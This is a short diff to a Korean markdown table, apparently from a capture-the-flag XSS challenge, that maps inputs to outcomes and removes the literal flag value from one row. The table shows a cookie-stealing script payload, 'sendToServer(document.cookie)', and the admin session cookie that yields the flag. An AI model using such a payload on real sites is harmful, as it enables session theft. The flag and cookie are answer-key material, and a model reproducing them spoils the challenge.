@@ -98,7 +98,7 @@
 | `오늘도 고생했어` | 🤖 긍정적인 응원 메시지 |
 | `<script>alert(1)</script>` | ❌ 아무 일도 일어나지 않음 (단순 alert) |
 | `<script>sendToServer(document.cookie)</script>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
-| `admin_session=j대리_secret_cookie_12345` | ✅ 최종 플래그: `flag{jeonminju_86}` |
+| `admin_session=j대리_secret_cookie_12345` | ✅ 최종 플래그 |
 | `admin_session=wrong_cookie_123` | ❌ 잘못된 쿠키 정보입니다 |
 
 <br>
